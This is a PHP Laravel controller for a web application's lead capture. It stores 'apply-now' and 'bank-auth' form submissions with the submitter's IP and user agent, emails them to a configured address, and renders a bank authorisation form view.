<?php

namespace App\Http\Controllers;

use App\Mail\FormDetailsMail;
use App\Mail\FormSubmissionMail;
use App\Models\AppSetting;
use App\Models\Lead;
use Illuminate\Http\Request;
use Illuminate\Mail\Mailable;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Mail;
use Throwable;

class HomeController extends Controller
{
    public function saveApply(Request $request){
        $formData = $request->except('_token');

        Lead::create([
            'source' => $request->path(),
            'form_type' => 'apply-now',
            'details' => $formData,
            'ip_address' => $request->ip(),
            'user_agent' => $request->userAgent(),
        ]);

        $this->sendLeadEmail(new FormDetailsMail($formData));

        return view('Congratulations');
    }
    public function saveApplyOne(Request $request){
        $formData = $request->except('_token');

        Lead::create([
            'source' => $request->path(),
            'form_type' => 'bank-auth',
            'details' => $formData,
            'ip_address' => $request->ip(),
            'user_agent' => $request->userAgent(),
        ]);

        $this->sendLeadEmail(new FormSubmissionMail($formData));
        return view('Terms');

        // return view('verification-in-process');
    }
    public function bank_auth_form(Request $request){
        // $formData = $request->all();

        $image=$request->image;
        // // Send the email
        // Mail::to('recipient@example.com')->send(new FormDetailsMail($formData));

        return view('bank_auth_form',compact('image'));
    }

    private function sendLeadEmail(Mailable $mailable): void
    {
        $leadSendToEmail = AppSetting::value('lead_send_to_email');

        if (empty($leadSendToEmail)) {
            return;
        }

        try {
            Mail::mailer('resend')->to($leadSendToEmail)->send($mailable);
        } catch (Throwable $exception) {
            Log::error('Failed to send lead notification email.', [
                'lead_send_to_email' => $leadSendToEmail,
                'message' => $exception->getMessage(),
            ]);
        }
    }
}
